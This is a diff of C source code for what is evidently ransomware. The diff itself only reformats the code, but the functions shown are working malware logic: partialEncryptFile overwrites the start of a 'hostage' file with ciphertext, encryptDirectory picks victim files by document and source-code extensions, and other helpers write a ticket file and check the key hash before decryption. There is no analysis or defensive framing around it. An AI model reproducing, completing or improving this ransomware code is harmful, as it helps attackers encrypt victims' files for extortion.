@@ -77,25 +77,24 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 	memset(plaintext, '\0', MAX_BYTES_TO_ENCRYPT);
 	fread(plaintext, 1, number_of_bytes, hostage);
 
-	
+
 	//Encrypt bytes
 	char ciphertext[MAX_BYTES_TO_ENCRYPT];
 	memset(ciphertext, '\0', MAX_BYTES_TO_ENCRYPT);
-	if (decrypt){
+	if (decrypt) {
 		symDecrypt(ciphertext, keyiv, plaintext, number_of_bytes);
-	}
-	else{
+	} else {
 		symEncrypt(ciphertext, keyiv, plaintext, number_of_bytes);
 	}
 
 
 	//Close then open to write
 	fclose(hostage);
-	if((hostage = fopen(filename, "r+b")) == NULL){
-		fprintf(stderr, "Error: partialEncryptFile: failed to open file for writing(r+b)");
+	if ((hostage = fopen(filename, "r+b")) == NULL) {
+		fprintf(stderr,
+			"Error: partialEncryptFile: failed to open file for writing(r+b)");
 		return 0;
 	}
-	
 	//Write bytes
 	if (fwrite(ciphertext, 1, number_of_bytes, hostage) !=
 	    (unsigned long) number_of_bytes) {
@@ -171,10 +170,10 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 		".doc\0", ".docx\0", ".odt\0", ".ppt\0", ".txt\0"
 		    //Programming
 		    ".c\0", ".js\0", ".cpp\0", ".h\0", ".java\0", ".py\0",
-		    ".pyw\0", ".ruby\0", ".perl\0", ".php\0", ".html\0",
-		    ".coffee\0", ".hpp\0", ".sh\0", ".bat\0", ".ps\0",
-		    ".makefile\0", ".cmd\0", ".gitignore\0", ".m\0",
-		    ".mm\0",
+		".pyw\0", ".ruby\0", ".perl\0", ".php\0", ".html\0",
+		".coffee\0", ".hpp\0", ".sh\0", ".bat\0", ".ps\0",
+		".makefile\0", ".cmd\0", ".gitignore\0", ".m\0",
+		".mm\0",
 		"\0"
 	};
 
@@ -197,7 +196,7 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 		} else {
 			vulnerable = true;
 		}
-		if (!vulnerable || getFileSize(ls[i])<16)
+		if (!vulnerable || getFileSize(ls[i]) < 16)
 			continue;
 
 		//Partial encrypt ls[i]
@@ -282,60 +281,68 @@ bool makeTicketFile(const char *keyiv, const char *directory)
 	return 1;
 }
 
-bool makeHashFile(const char* keyiv, const char* directory){
+bool makeHashFile(const char *keyiv, const char *directory)
+{
 	//Get hash of keyiv
 	const unsigned int hash_length = 2;
 	char hash[hash_length];
-	hash16(hash,keyiv,SYMMETRIC_IV_SIZE+SYMMETRIC_KEY_SIZE);
-	
+	hash16(hash, keyiv, SYMMETRIC_IV_SIZE + SYMMETRIC_KEY_SIZE);
+
 	//Find path
-	char *path = (char *)malloc(strlen(directory)+strlen("/"HASH_FILENAME));
-	strcpy(path,directory);
-	strcat(path,"/"HASH_FILENAME);
-	
+	char *path =
+	    (char *) malloc(strlen(directory) + strlen("/" HASH_FILENAME));
+	strcpy(path, directory);
+	strcat(path, "/" HASH_FILENAME);
+
 	//Open file
-	FILE* fp = fopen(path, "wb");
-	if(fp == NULL){fprintf(stderr, "Error: makeHashFile: failed to open %s\n", path);return 0;}
-	
-	//Write to file
-	if (fwrite(hash, 1, hash_length, fp)!=hash_length){
-		fprintf(stderr, "Error: makeHashFile: failed to write to file\n");
+	FILE *fp = fopen(path, "wb");
+	if (fp == NULL) {
+		fprintf(stderr, "Error: makeHashFile: failed to open %s\n",
+			path);
 		return 0;
 	}
-	
+	//Write to file
+	if (fwrite(hash, 1, hash_length, fp) != hash_length) {
+		fprintf(stderr,
+			"Error: makeHashFile: failed to write to file\n");
+		return 0;
+	}
 	//Clean up and return
 	fclose(fp);
 	free(path);
 	return 1;
 }
 
-bool checkKeyivIntegrity(const char* keyiv, const char* directory){
+bool checkKeyivIntegrity(const char *keyiv, const char *directory)
+{
 	//Get hash of keyiv
 	const int hash_length = 2;
 	char hash[hash_length];
-	hash16(hash,keyiv,SYMMETRIC_IV_SIZE+SYMMETRIC_KEY_SIZE);
-	
+	hash16(hash, keyiv, SYMMETRIC_IV_SIZE + SYMMETRIC_KEY_SIZE);
+
 	//Find path
-	char *path = (char *)malloc(strlen(directory)+strlen("/"HASH_FILENAME));
-	strcpy(path,directory);
-	strcat(path,"/"HASH_FILENAME);	
+	char *path =
+	    (char *) malloc(strlen(directory) + strlen("/" HASH_FILENAME));
+	strcpy(path, directory);
+	strcat(path, "/" HASH_FILENAME);
 
 	//Open file for reading\n
-	FILE* fp = fopen(path, "rb");
-	if(fp == NULL){
-		fprintf(stderr, "Error: checkKeyivIntegrity: failed to open %s\n", path);
+	FILE *fp = fopen(path, "rb");
+	if (fp == NULL) {
+		fprintf(stderr,
+			"Error: checkKeyivIntegrity: failed to open %s\n",
+			path);
 		return 0;
 	}
-	
 	//Read file
-	char* old_hash=(char *)malloc(hash_length);
+	char *old_hash = (char *) malloc(hash_length);
 	fread(old_hash, 1, hash_length, fp);
 	fclose(fp);
-	
-	
+
+
 	//Compare hash
-	for(int i=0; i < hash_length; i++){
-		if(old_hash[i]!=hash[i]){
+	for (int i = 0; i < hash_length; i++) {
+		if (old_hash[i] != hash[i]) {
 			free(old_hash);
 			free(path);
 			return false;
@@ -344,5 +351,5 @@ bool checkKeyivIntegrity(const char* keyiv, const char* directory){
 	free(path);
 	free(old_hash);
 	return true;
-	
+
 }
